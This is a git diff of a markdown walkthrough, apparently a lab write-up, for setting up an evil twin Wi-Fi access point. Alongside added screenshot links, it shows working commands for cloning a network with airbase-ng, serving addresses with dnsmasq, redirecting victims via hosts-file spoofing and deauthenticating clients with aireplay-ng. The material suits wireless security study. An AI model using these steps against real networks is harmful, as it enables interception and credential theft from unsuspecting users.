@@ -101,12 +101,14 @@ This document outlines the steps we took in order to setup an evil twin access p
 	iw reg set US              
 	ifconfig wlan1mon up       
 	```
-	Again you can check the signal strength with `iwconfig wlan1mon`
+	Again you can check the signal strength with `iwconfig wlan1mon`  
+	The Tx-Power should now read 30 dBm.
 
 12. Start up the evil twin AP (access point)  
 	Give the evil twin the same name as the network you are attacking on the same channel.  
 	`airbase-ng -e "zzzz" -c 11 wlan1mon`  
 	At this point you should be able to see your evil network listed under the available wireless networks on your phone or computer. It will have the same name, but not be password protected.
+	![evil](../screenshots/12-evil_twin.png)
 
 13. Create an interface to give the evil twin connection to the internet.  
 	```
@@ -133,6 +135,8 @@ This document outlines the steps we took in order to setup an evil twin access p
 16. Enable the evil twin to allocate ip addresses to clients.  
 	`dnsmasq -C /root/Desktop/dnsmasq.conf -d`  
 	Congratulations, you have setup a hotspot for yourself.
+	![intercept](../screenshots/16-dnsmasq.png)
+	![intercept2](../screenshots/16.1-dnsmasq.png)
 
 17. Now we can start a local Apache webserver that we can redirect traffic to.  
 	Place a webpage under  
@@ -153,6 +157,8 @@ This document outlines the steps we took in order to setup an evil twin access p
 	`127.0.0.1	example.com`  
 	Note that the ip address and url must be separated by a tab, not spaces.
 	You can add as many lines like this as you like for redirecting traffic. Currently only http sites work, not https sites.
+	![intercept2](../screenshots/19-spoof.png)
+
 
 20. Now deauthorize clients so they connect to our network instead of their legit network.  
 	`aireplay-ng –deauth 0 -a <BSSID> wlan1mon`
